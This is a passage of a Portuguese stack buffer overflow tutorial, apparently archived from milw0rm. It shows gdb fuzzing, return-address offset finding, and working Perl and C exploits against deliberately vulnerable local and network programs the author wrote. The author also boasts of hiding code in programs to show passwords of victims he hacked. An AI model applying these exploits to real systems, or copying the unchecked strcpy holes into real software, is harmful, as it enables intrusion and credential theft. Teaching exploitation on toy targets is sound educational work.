0x40129d &lt;overflow+13&gt;: lea    0xfffffffc(%ebp),%eax   
0x4012a0 &lt;overflow+16&gt;: mov    %eax,(%esp,1)            
0x4012a3 &lt;overflow+19&gt;: call   0x401860 &lt;strcpy&gt;       
0x4012a8 &lt;overflow+24&gt;: lea    0xfffffffc(%ebp),%eax   
0x4012ab &lt;overflow+27&gt;: mov    %eax,(%esp,1)           
0x4012ae &lt;overflow+30&gt;: call   0x401850 &lt;puts&gt;         
0x4012b3 &lt;overflow+35&gt;: leave
0x4012b4 &lt;overflow+36&gt;: ret
End of assembler dump.


Agora vamos usar uma tecnica chamada de &quot;fuzzing&quot; para saber  quantos bytes
precisaremos para alcancar o  endereco de retorno. Essa  tecnica  foi muito  
evoluida, mas aqui nao vamos entrar em  detalhes, falarei apenas do basico,
que consiste em injetar em buffers, grandes quantidades  de bytes e esperar  
alguma mensagem  de erro. Macete  bem &quot;espartano&quot; eim? Vamos entao &quot;fuzzar&quot; 
este programa dentro do gdb:


(gdb) r AAA
Starting program: C:\Documents and Settings\David/programa1.exe AAA

Program exited normally.


Nem um problema, vejam que o proprio gdb nos mostra que o programa saiu 
normalmente. Agora vamos transbordar  (overflow) nosso buffer e atraves 
dele encostaremos no endereco de retorno do stack frame &quot;Overflow&quot;.


(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA         
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: C:\Documents and Settings\David/programa1.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()


OK, por incrivel que pareca essa mensagem de erro e boa para  nos };P Segmentation fault 
e a mensagem que nos e exibida nos linuxes quando o stack frame retorna para uma area de
memoria invalida; Nao se esqueca que estamos em uma ferramenta nativa do linux, por isso 
tambem temos essa mensagem. Vejam que interessante, A em ASCII equivale ao 41 em hexade-
cimal, veja


main (){

 printf (&quot;%x\n&quot;, &#039;A&#039;);
 system (&quot;pause&quot;);

}


Resultado:

41         &lt;--- 0x41

Pressione qualquer tecla para continuar. . .


(gdb) i r
eax            0x22ff60 2293600
ecx            0x3d3d60 4013408
edx            0xababab00       -1414812928
ebx            0x4000   16384
esp            0x22ff80 0x22ff80
ebp            0x41414141       0x41414141             &lt;-- ebp sobrescrito
esi            0xdca4f0 14460144
edi            0xd7ea70 14150256
eip            0x41414141       0x41414141             &lt;-- Proxima instrucao.
eflags         0x10246  66118
cs             0x1b     27

(...)


Lembrando que o processador &quot;sempre&quot; trabalha no nivel hexadecimal.


O nosso objetivo agora e saber em quantos bytes podemos alcancar o  endereco 
de retorno. Para isso utilizaremos  uma tecnica chamada Binary Tree Analysis 
ou BTA, que consiste na insercao de um buffer com  dados variados,  exemplo, 
inserimos x numeros de A&#039;s, depois x numero de B&#039;s e x numeros de C&#039;s,  se o 
debuger utilizado nos  retornar  que a base  do stack frame foi  sobrescrita 
por 0x42 que representa o B, entao &quot;obviamente&quot; que o &#039;ebp&#039;  esta entre os x 
B&#039;s inseridos, e assim por diante. 


(gdb) r AAAADDDDRRRR
Starting program: C:\Documents and Settings\David/programa1.exe AAAADDDDRRRR

Program received signal SIGSEGV, Segmentation fault.
0x52525252 in ?? ()


Buffer        = A 
Base pointer  = D
Return addres = R

Alcancamos o endereco de retorno!! Como eu sei? Veja:

 0x52525252 in ?? ()  &lt;-- Observe que 52 em hexadecimal corresponde a R

O que aconteceu foi isso:


+--------------+
|  buffer[1]   |    = A                  ||
+--------------+                         ||
+--------------+                         ||
|  buffer[2]   |    = A                  || 
+--------------+                         ||  
+--------------+                         ||
|  buffer[3]   |    = A                  ||
+--------------+                         ||
+--------------+                         ||
|  buffer[4]   |    = A                  || 
+--------------+                         ||
+--------------+                         || 
| FBP (4 bytes)|    = DDDD               ||
+--------------+                         ||
| RETURN ADDR  |    = RRRR (0x52)        VV
+--------------+


Veja que o endereco de retorno vai retornar o 0x52, que nao e um endereco
valido, alocado na memoria, por isso o signal SIGSEGV e  retornado. Vamos 
causar o overflow no stack frame de main:


-- main_overflow.c -- 

main (int argc, char *argv[]){
 
 if (argc != 2) exit (0);
 
 char frame[16];
 strcpy (frame, argv[1]);     // &lt;- Copia o que nos digitarmos para a \
                                    variavel frame (sem controle).
     
}

-- cut -- 



C:\Documents and Settings\David\Meus documentos&gt;gdb main_overflow.exe -q
(gdb) r AAAAAAAAAAAAAAAADDDDDDDDBBBBRRR
Starting program: C:\Documents and Settings\David\Meus documentos/main_overflow.exe AAAAAAAAAAAAAAAADDDDDDDDBBBBRRR

Program received signal SIGSEGV, Segmentation fault.
0x00525252 in ?? ()


Repare acima que esta faltando 1 unico byte para completar os 4 que compoem o endereco
de retorno. Entao apenas precisariamos inserir mais um &#039;R&#039;


(gdb) r AAAAAAAAAAAAAAAADDDDDDDDBBBBRRRR
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: C:\Documents and Settings\David\Meus documentos/main_overflow.exe AAAAAAAAAAAAAAAADDDDDDDDBBBBRRRR

Program received signal SIGSEGV, Segmentation fault.
0x52525252 in ?? ()

Agora o RET esta totalmente sobrescrito. Entao e necessario os seguintes bytes
para alcancarmos o endereco de retorno:


Buffer    =    AAAAAAAAAAAAAAAA (16 bytes)
Dummy     =    DDDDDDDD (8 bytes)
FBP       =    FFFF (4 bytes)
RET       =    RRRR (4 bytes)


+--------------+
|  buffer[0]   |    = A                  ||
+--------------+                         ||
+--------------+                         ||
|  buffer...   |    = A                  || 
+--------------+                         ||  
+--------------+                         ||
|  buffer[16]  |    = A                  ||
+--------------+                         ||
+--------------+                         ||
|   Dummy (8)  |    = DDDDDDDD           || 
+--------------+                         ||
+--------------+                         || 
| FBP (4 bytes)|    = FFFF               ||
+--------------+                         ||
| RETURN ADDR  |    = RRRR (0x52)        VV
+--------------+
     
       ^
       |
       |
       +---&gt; O stack frame retornara para RRRR (SIGSEGV)




----- Capitulo 0x0B


[=] + =========================================== + [=]
       ---=[  Seu primeiro exploit (local) ]=--- 
[=] + =========================================== + [=]


Bem, para esse primeiro exemplo de &quot;exploracao&quot; de stack overflow, nao mostrarei a 
utilizacao de shellcode, por  hora voce apenas sabera como controlar o endereco de 
retorno para o mesmo retornar a algum lugar na memoria. Bem, a tecnica de explora-
cao local  pode ter  varias  utilidades, eu costumava  esconder uma funcao no qual 
me mostrava minhas  senhas e das  vitimas que  hackiava, em alguns programas, eram 
centenas de senhas e ainda nao havia memorizado todas, quando queria visualiza-las 
explorava localmente a aplicacao cobaia e fazia o RETURN  retornar a  minha funcao 
oculta, e assim fazendo com que o programa  apresentasse-me as senhas. 


Exemplo:


-- show_passwords.c -- 

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

void function_vuln ();

void show_pass (){

   char *password[] = {

   &quot;Email: test@testing.com \n&quot;,
   &quot;Pass : this_is_a_test&quot;
};

   int i=0;

   while (i != 2){
   fputs (password[i], stdout);
   ++i;}  
  
  exit (0);
}


int main (int argc, char *argv[]){

  // It doesn&#039;t drink much water ... :)

  puts (&quot;Do you can give me some water? yes/no&quot;);

  if (argc != 2) exit (0);

  function_vuln (argv[1]); 

 return 0;
}

void function_vuln (char *string) {

 
  char buffer[16];
  strcpy (buffer, string);             // &lt;- A falha esta aqui.

  if (!strncmp (buffer, &quot;yes&quot;, strlen (&quot;yes&quot;)) ){
  system (&quot;cls&quot;);
  fprintf (stdout, &quot;%s&quot;, &quot;Thank&#039;x man\n&quot;);   
}

  else 
  puts (&quot;\n\nWell, well, well -&gt; FuCk\n&quot;);


}

-- cut -- 


Passo 1..:


C:\Documents and Settings\David&gt;show_passwords.exe
Do you can give me some water? yes/no

C:\Documents and Settings\David&gt;show_passwords.exe yes


Resultado..:

Thank&#039;x man

C:\Documents and Settings\David\Desktop&gt;


Este programa pergunta se o usuario quer dar agua a ele (lol), se o usuario 
digitar sim, ele diz &quot;obrigado&quot;, caso contrario o usuario recebe uma mensa-
gem de erro. Veja que em nenhum  momento e feito qualquer  chamada a funcao
show_pass (). Vejamos onde esta a falha:

strcpy (buffer, argv[1]);                

Como ja falei, strcpy() nao faz checagem alguma dos dados que serao copiados 
para o buffer de destino. E atraves desta falha que vamos explorar esse pro-
grama e fazer o endereco de retorno retornar   para o  local na  memoria que 
queremos. Antes de explorarmos a aplicacao acima, escreverei outra aplicacao 
bugada para  mostrar  a exploracao  de  programas  que  recebem o  parametro 
argument count e argument values.


-- exploit-me_v1.0.c -- 


void show_pass (){

        char *password[] = {
        &quot;Email: test@testing.com \n&quot;,
        &quot;Pass : this_is_a_test&quot;
};

}

main (int argc, char **argv){

  char buffer[16];             // &lt;-- Portal da felicidade
  strcpy (buffer, argv[1]);    // &lt;-- Nosso bombom

}

-- cut -- 


C:\&gt;gdb exploit-me_v1.0.exe -q
(gdb) disass show_pass
Dump of assembler code for function show_pass:
0x401290 &lt;show_pass&gt;:   push   %ebp
0x401291 &lt;show_pass+1&gt;: mov    %esp,%ebp
0x401293 &lt;show_pass+3&gt;: sub    $0x8,%esp
0x401296 &lt;show_pass+6&gt;: movl   $0x403000,0xfffffff8(%ebp)
0x40129d &lt;show_pass+13&gt;:        movl   $0x40301a,0xfffffffc(%ebp)
0x4012a4 &lt;show_pass+20&gt;:        leave
0x4012a5 &lt;show_pass+21&gt;:        ret
End of assembler dump.
(gdb) q

C:\&gt;


0x401290 &lt;--- Retornaremos este endereco. Agora vamos fazer o 
exploit em perl apenas para uma melhor aprendizagem.


-- first_exploit.pl -- 

####################################################
### O primeiro exploit voces nunca vao esquecer ;) #
####################################################

# Caminho do .executavel bugado

my $PATH =&quot;c:\\exploit-me_v1.0.exe &quot;;  

# Dados para sobrescrever o stack frame da funcao main

my $Buffer = &quot;A&quot; x 16;    # Buffer
my $Dummy  = &quot;D&quot; x  8;    # Dummy
my $FBP    = &quot;B&quot; x  4;    # Frame Base Pointer

#Endereco de retorno (De tras para frente - LIFO)
#Endereco de show_pass ();

my $RET  = &quot;\x90\x12\x40\x00&quot;;        

#Anexamos a variavel &#039;$exploit&#039; as outras variaveis

my $exploit =$Buffer.$Dummy.$FBP.$RET;                                                
             #AAA... DDD... BBB... &quot;\x90\x12\x40\x00&quot;;            


print (&quot;\nSending exploit, please wait...\n\n&quot;);

print $exploit;

system ($PATH,  $exploit);   # &lt;-- Chama o programa e usa o argumento 
                             #  $exploit &lt;-- Onde estao os dados.
-- cut -- 


Sei que voce (Brasileiro =) ficara empolgadissimo com isso:



C:\&gt;first_exploit.pl

Sending exploit, please wait...

AAAAAAAAAAAAAAAADDDDDDDDBBBBÃ‰?@
Email: test@testing.com
Pass : this_is_a_test
C:\&gt;


owned! huhuhu (sndMas rlz ;). OK. The program has been exploited. We 
have total control of the return address.


================================
Exploitando o show password v1.0
================================


Primeiro passo...: Descobrindo o endereco que queremos retornar.


C:\Documents and Settings\David\Desktop&gt;gdb show_passwords.exe -q
(gdb) disass show_pass
Dump of assembler code for function show_pass:
0x401290 &lt;show_pass&gt;:   push   %ebp
0x401291 &lt;show_pass+1&gt;: mov    %esp,%ebp

(...)

O resto das instrucoes nao nos importam, o que queremos e o endereco inicial 
desta funcao. Que eh: 0x&#039;401290&#039;. Como vimos anteriormente para a exploracao 
de buffers de 16 bytes precisariamos de &#039;16&#039; bytes para lotar a area que foi 
reservada para esse buffer no stack frame, os 8 bytes de  dummy mais os 4 do 
FBP (ebp). Entao podemos inferir que devemos inserir o endereco  0x401290 na 
area RET do stack frame. Vamos fazer logo esse exploit em C:



-- exploit_for_SPv1.c -- 

/*
*
*   Exploit for to exploit a flaw in the
*           Show Passwords v0.1
*
*   Bug discovered by 6_Bl4ck9_f0x6 :)
*
*/


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;windows.h&gt;

#define RET &quot;\x90\x12\x40\x00&quot;

main (){

 printf (&quot;Sending exploit, please wait...\r\n\r\n&quot;);

 // A funcao WinExec executa um programa e passa parametros ao mesmo.

 WinExec (&quot;\\show_passwords.exe yesAAAAAAAAAAAAADDDDDDDDBBBB\x90\x12\x40\x00&quot;, 0);
 exit (0);
 
}

-- cut here -- 


C:\&gt;exploit_for_SPv1.exe

Resultado..:


Thank&#039;x man
Email: test@testing.com
Pass : this_is_a_test
C:\&gt;


Simples, nao? Existe a classe dos que ensinam e a classe dos que gostam
de aparecer (White Corja Poser Brasileira). 



----- Capitulo 0x0C


[=] + =========================================== + [=]
           ---=[ Exploracao remota ]=--- 
[=] + =========================================== + [=]


Escrevi um pequeno servidor vulneravel a stack overflow, obviamente que
isso foi intencional ehehhe...:)


-- fox_server.c -- 

/*
*
*   Aprendam uma coisa de uma vez por todas: 
*         A rede globo eh a maior ;)           
* 
*          &lt;- Tava devendo essa -&gt; 
*
*/ 

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;
#include &lt;winsock2.h&gt;

#define BACKLOG 5
#define PORT 666

WSADATA data;
struct sockaddr_in local_bind, server;

int SoCk, SoCkII;
int login_ ();
char username[400];

int secret_function (){
 
     char *message=&quot;\n\n Hi 6_Bl4ck9_f0x6 \n\n&quot;;
     fprintf (stdout, message, strlen (message));
}


int main (){    

    memset (username, 0x00, 0x08);
    
    WSAStartup (MAKEWORD (2,2),&amp;data);
    
    SoCk = socket (PF_INET, SOCK_STREAM, 0);
    
    local_bind.sin_family=AF_INET;
    local_bind.sin_port=htons (PORT);
    local_bind.sin_addr.s_addr = htonl (INADDR_ANY);
    memset (&amp;local_bind.sin_zero, 0x00, 0x08);  
    
    bind (SoCk, (struct sockaddr *)&amp;local_bind, 0x10);
    
    unsigned int len=sizeof (SOCKADDR_IN);
    
    listen (SoCk, BACKLOG);
    fprintf (stdout, &quot;Listening in the %d port...&quot;, \
ntohs (local_bind.sin_port));

    SoCkII = accept (SoCk, (struct sockaddr *)&amp;server, &amp;len);
    closesocket (SoCk);
    
    u_char *msgs=&quot;   \n\n  --=[ Welcome to the Black Machine ]=--\n&quot;; 
    u_char *login=&quot;\nLogin: \n&quot;;
      
    send (SoCkII, msgs, strlen (msgs), 0x00); 
    send (SoCkII, login, strlen (login), 0x00); 
    
    recv (SoCkII, username, 400, 0x00);
    
    login_ ();
}

login_ (){
       
    printf (&quot;%d&quot;, strlen (username));
    char buffer[200];
    strcpy (buffer, username);
    
    if (!strncmp (buffer, &quot;6_Bl4ck9_f0x6&quot;, 13)){
    send (SoCkII, &quot;\n\nBem vindo fox\n&quot;, strlen (&quot;\n\nBem vindo fox\n&quot;), 0x00);
    return 0;}

 else{ 
    send (SoCkII, &quot;\nLogin invalido...&quot;, strlen (&quot;\nLogin invalido...&quot;), 0x00);
    Sleep (3000);
    send (SoCkII, &quot;\nEstou te rastreando... Buu\n\n&quot;, \
strlen (&quot;\nEstou te rastreando... Buu&quot;), 0x00);
     WSACleanup();
     closesocket (SoCk);
}

}     

-- cut -- 


Nao me preocupei muito com organizacao, portanto nao me mandem emails falando
que o server nao ta bonitinho rsrs. Ah! Os testes abaixo  foram  feitos com o 
seguintes buffers:


char username[400];  &amp;  char buffer[200];


C:\Documents and Settings\David\Desktop&gt;fox_server.exe
Listening in the 666 port...


Utilizarei o netcat como cliente


C:\Documents and Settings\David&gt;nc 127.0.0.1 666


  --=[ Welcome to the Black Machine ]=--

Login:


Ele espera eu digitar um login. O login que nao precisa de senha e meu 
nick: 6_Bl4ck9_f0x6 . Se voce digitar outro acontece isso:


 -- cut -- 

C:\Documents and Settings\David&gt;nc 127.0.0.1 666


  --=[ Welcome to the Black Machine ]=--

Login:
Obtruder

Login invalido...
Estou te rastreando... Buu

-- cut -- 


Foi so um charminho, relaxa }=) Entao, o overflow ocorre na autenticacao
do usuario. Vejam so:


    char buffer[60];
    strcpy (buffer, username); 


Se o nome de usuario conter mais de 60 bytes ocorre o overflow no stack frame
da funcao login_() . Execucao correta do server:


-- cut -- 

  --=[ Welcome to the Black Machine ]=--

Login:
6_Bl4ck9_f0x6


Bem vindo fox

-- cut -- 


Vamos rodar o servidor dentro do debug.


C:\Documents and Settings\David\Desktop&gt;gdb fox_server.exe
GNU gdb 5.2.1
Copyright 2002 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.
This GDB was configured as &quot;i686-pc-mingw32&quot;...
(gdb) r
Starting program: C:\Documents and Settings\David\Desktop/fox_server.exe

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) q
The program is running.  Exit anyway? (y or n) y

C:\Documents and Settings\David\Desktop&gt;


Veja melhor:

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()


Veja porque isso aconteceu:


  --=[ Welcome to the Black Machine ]=--

Login:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Login invalido...
Estou te rastreando... Buu


Vamos achar o endereco de retorno usando Binary Tree Analysis



  --=[ Welcome to the Black Machine ]=--

Login:
AAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCDDDDDDDDDDDDDD

Login invalido...
Estou te rastreando... Buu


Veja abaixo que o RET esta entre os C&#039;s digitados:


Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
(gdb) 


Vamos inserir entre os 4 C&#039;s, alguns A&#039;s 



  --=[ Welcome to the Black Machine ]=--

Login:
AAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBCCCCCCCCCCAAAADDDDDDRRRR

Login invalido...
Estou te rastreando... Buu
C:\Documents and Settings\David&gt;


Starting program: C:\Documents and Settings\David\Desktop/fox_server.exe

Program received signal SIGSEGV, Segmentation fault.
0x41414143 in ?? ()


Yeah! Yeah! Yeah! Veja acima que o RET comeca a ser sobrescrito deste ponto:

AAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBCCCCCCCCCCAAA    [ ADDDDDDRRRR ]
                                                       | 
                                                       +-- &gt; Here!

Entao ja sabemos quantos bytes serao necessarios para alcancarmos o endereco
de retorno.


Login:
AAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBCCCCCCCCCRRRRADDDDDDRRRR
                                                    |__|
                                                      |
                                                      +-- &gt; RETURN ADDRESS


-- fox_server_exploit.c -- 

/*
*
*  Simples exploit para fazer o programa vulneravel 
*  retornar a um endereco de memoria. 
*     
*         Coded by 6_Bl4ck9_f0x6
*
*/


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;winsock2.h&gt;

#define NOP 0x90

WSADATA data;
SOCKADDR_IN server;
int len=sizeof (server);

main (){

  WSAStartup (MAKEWORD (2,2),&amp;data);
  
  int SoCk = socket (AF_INET, SOCK_STREAM, IPPROTO_IP);

  server.sin_family = AF_INET;
  server.sin_port = htons (666);
  server.sin_addr.s_addr = inet_addr (&quot;192.168.1.1&quot;);
  memset (&amp;server.sin_zero, 0x00, 0x08);

  u_char payload[224], ret[]=&quot;\x90\x12\x40&quot;;
  
  if ( (connect (SoCk, (struct sockaddr *)&amp;server, sizeof (SOCKADDR_IN))) == 
SOCKET_ERROR){
  fprintf (stdout, &quot;\n[Porta fechada]\n&quot;);
  return (0);}
  
  memset (payload, NOP, sizeof (payload)); 
  memcpy (payload +220, ret, 0x04);
  
  printf (&quot;Sending exploit...\n&quot;);
  
  send (SoCk, payload, 224, 0);

  closesocket (SoCk);
  system (&quot;pause&quot;);
 
}

-- cut -- 

fiz o BTA e descobri que para alcancar o endereco de retorno preciso
de 224 bytes, ou seja, 220 para enchermos o buffer vulneravel na app
bugada, mais o endereco de retorno. 

ret[]=&quot;\x90\x12\x40&quot;;

Acima e o endereco da funcao que esta oculta no programa vulneravel.

  1 - memset (payload, NOP, sizeof (payload)); 
  2 - memcpy (payload +220, ret, 0x04);

1 -- &gt; Encho a variavel payload de NOP&#039;s.
2 -- &gt; Logo depois copio para o final dela 
       o endereco de retorno. 

E envio 224 bytes atraves do socket.

Primeiro o exploit estabelece uma conexao na maquina na vitima:

-- cut -- 

if ( (connect (SoCk, (struct sockaddr *)&amp;server, sizeof (SOCKADDR_IN))) == 
SOCKET_ERROR){
  fprintf (stdout, &quot;\n[Porta fechada]\n&quot;);
  return (0);}

-- cut -- 


Depois envio o payload que vai explorar o programa:

-- cut -- 

 send (SoCk, payload, 224, 0);

-- cut -- 

Sending exploit...
Pressione qualquer tecla para continuar. . .

E o resultado eh este:

C:\Documents and Settings\David\Meus documentos&gt;fox_server.exe
Listening in the 666 port...223

 Hi 6_Bl4ck9_f0x6


     =========================================================
     +  http://www.hunterhacker.xpg.com.br/exploited.JPG     +
     =========================================================


----- Capitulo 0x0E


[=] + =========================================== + [=]
             ---=[ Consideracoes finais ]=--- 
[=] + =========================================== + [=]


Um critico natural, amante da beleza  feminina, amante das coisas boas da vida, 
alguem que pretende ter familia, ter  alguem  pra quem  deixar o  que aprendeu. 
Alguem que as unicas coisas que quer e privacidade e felicidade, alguem que nao 
entende porque as pessoas possuem muito poder, alguem que nao entende porque as 
pessoas menores se deixam obedecer, alguem que espera...


&quot;A verdadeira mascara e aquela que voce carrega dentro de si.&quot;
                                      -- &quot; &quot;

----[ Useful links and references


    =====================================================================
    Course of C Part 4 - Final Version. Written for my e-zine (C.O.D.E).
    
    [1] - http://www.blackhat-forums.com/index.php?showtopic=8574
    =====================================================================
    Exploiting Heap Overflow in the windows without mistery
   
    [2] - http://www.hunterhacker.xpg.com.br/Heap_Overflow.txt
    =====================================================================
    Stack/buffer overflow by blackwinner 

    [3] - http://www.forum.darkers.com.br/index.php?topic=9941.msg44462;topicseen#msg44462
    =====================================================================
    Difference Between AT&amp;T and Intel Assembly Syntax

    [4] - http://www.w00w00.org/files/articles/att-vs-intel.txt
    =====================================================================
    Tutorial Basico do gcc e entendendo as etapas de compilacao

    [5] - http://www.hunterhacker.xpg.com.br/gcc_tuto_1.txt
    =====================================================================
     

&quot;O ser mais perigoso e aquele que nao representa perigo algum.&quot;

[]`s

by 

6_Bl4ck9_f0x6 - Viper Corp Group

# milw0rm.com [2009-05-08]
            </code></pre>

                    </div>

                    <div class="card-footer">

                        <div class="row">

                            <div class="col">

                                <strong>Tags:</strong>

                                
                            </div>

                            <div class="col">

                                
                                
                            </div>

                            <div class="col">

                                <span class="float-right">

                                    <strong>Advisory/Source:</strong>

                                    <a href="" target="_blank">
                                        Link
                                    </a>

                                </span>

                            </div>

                        </div>

                        <div class="row mt-3">

                            <div class="btn-group ml-2">

                                <a class="btn btn-primary btn-fab btn-icon btn-round"
                                   href="/papers/12924" aria-label="View Previous Paper"
                                   data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                    <i class="mdi mdi-arrow-left mdi-36px"></i>
                                </a>

                            </div>

                            <div class="col">

                                <div class="btn-group float-right">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/12926" aria-label="View Next Paper"
                                       data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                        <i class="mdi mdi-arrow-right mdi-36px"></i>
                                    </a>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                <div class="card">

                    <div class="card-footer">

    <div class="d-none d-lg-block">

        <div class="container-fluid">

            <table class="table table-borderless text-center">

                <thead style="background-color:#083257;">

                <tr class="text-white">
                        <th>
                            <strong>Downloads</strong>
                        </th>
                        <th>
                            <strong>Certifications</strong>
                        </th>
                        <th>
                            <strong>Training</strong>
                        </th>
                        <th>
                            <strong>Professional Services</strong>
                        </th>
                    </tr>

                </thead>

                <tbody>

                <tr class="text-center">
                    <td>
                        <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                            Kali Linux
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">OSCP
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/"
                           target="_blank" rel="noopener">Penetration Testing
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td>
                        <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                           target="_blank" rel="noopener">
                            Kali NetHunter
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">OSWP
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                           target="_blank" rel="noopener">Advanced Attack Simulation
                        </a>
                    </td>
                </tr>
                <tr>
                    <td>
                        <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                           target="_blank" rel="noopener">Kali Linux Revealed Book
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">OSEP
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#asa"
                           target="_blank" rel="noopener">Application Security Assessment
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">OSWE
                        </a>
                    </td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                           <br />Updated for 2020
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">OSED
                        </a>
                    </td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                           <br />All new for 2021
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://www.offensive-security.com/awe-osee/"
                           target="_blank" rel="noopener">OSEE
                        </a>
                    </td>
                    <td>
<!--
                        <a href="https://www.offensive-security.com/metasploit-unleashed/"
                           target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                        </a>
-->
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://kali.training/"
                           target="_blank" rel="noopener">KLCP
                        </a>
                    </td>
                    <td>
                        <a href="https://kali.training/courses/kali-linux-revealed/"
                           target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                        </a>
                    </td>
                    <td></td>
                </tr>

                </tbody>

            </table>

        </div>

    </div>

    <div class="d-lg-none text-center">

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownDownloads" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Downloads
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownDownloads">

                <a class="dropdown-item" href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                    Kali Linux
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                   target="_blank" rel="noopener">
                    Kali NetHunter
                </a>
                <a class="dropdown-item"
                   href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                   target="_blank" rel="noopener">
                    Kali Linux Revealed Book
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownCerts" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Certifications
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownCerts">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener">OSCP
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">OSWP
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">OSEP
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">OSWE
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">OSED
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/awe-osee/"
                   target="_blank" rel="noopener">OSEE
                </a>
                <a class="dropdown-item" href="https://kali.training/"
                   target="_blank" rel="noopener">KLCP
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownTraining" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Training
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownTraining">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener"> - Penetration Testing with Kali Linux (PWK) (PEN-200)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
